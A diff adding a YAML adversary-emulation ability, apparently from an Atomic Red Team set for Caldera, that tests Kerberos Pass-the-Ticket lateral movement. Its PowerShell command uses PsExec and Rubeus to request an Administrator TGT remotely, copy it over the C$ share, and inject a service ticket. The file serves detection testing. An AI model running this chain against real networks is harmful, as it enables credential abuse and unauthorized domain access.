@@ -1,0 +1,32 @@
+---
+- id: 566388d2f3073aced1a2c86b3a65826c
+  name: Rubeus Kerberos Pass The Ticket
+  description: 'Requesting a TGT on a remote system and retrieving it locally before
+    requesting a service ticket with it. This is a Pass-The-Ticket attack because
+    the TGT is obtained on the remote system, then used from a different machine (local).
+
+    PsExec is used to execute commands on the remote system, and the "C$" admin share
+    is used to retrieve the TGT, so the current user must have admin rights remotely
+    and other PsExec prerequisites must be met.
+
+    '
+  tactic: lateral-movement
+  technique:
+    attack_id: T1550.003
+    name: 'Use Alternate Authentication Material: Pass the Ticket'
+  platforms:
+    windows:
+      psh:
+        command: '& "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula
+          \\localhost -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
+          asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi;
+          Set-Location "PathToAtomicsFolder\..\ExternalPayloads"; Move-Item -Force
+          "\\localhost\c$\ticket.kirbi" ticket.kirbi; Write-Host "Successfully retrieved
+          TGT from ''localhost'', now requesting a TGS from local"; & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
+          asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt; Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi";
+          & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
